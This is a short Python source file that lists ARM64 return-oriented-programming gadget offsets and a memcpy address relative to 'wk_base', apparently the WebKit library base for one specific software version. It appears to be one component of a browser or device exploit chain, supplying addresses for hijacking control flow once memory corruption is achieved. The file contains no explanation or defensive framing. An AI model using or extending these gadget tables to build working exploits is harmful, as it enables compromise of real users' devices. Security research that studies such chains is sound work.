from relocatable import wk_base


class Gadgets210Wk:
    pop_0000_x22_x21_x20_x19_x29_x30 = wk_base + 0x142908
    mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 = wk_base + 0x729d5c
    load_x0_to_x4_blr_x8 = wk_base + 0x8c8ae8
    pop_00000000_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30 = wk_base + 0x9d3998
    load_x5_to_x7_trash_stack_blr_x8 = wk_base + 0xf264ec

    load_x1_to_x4_blr_x8 = load_x0_to_x4_blr_x8 + 0x4
    blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 = mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 + 0xc


class Functions210Wk:
    memcpy = wk_base + 0xf2ed60
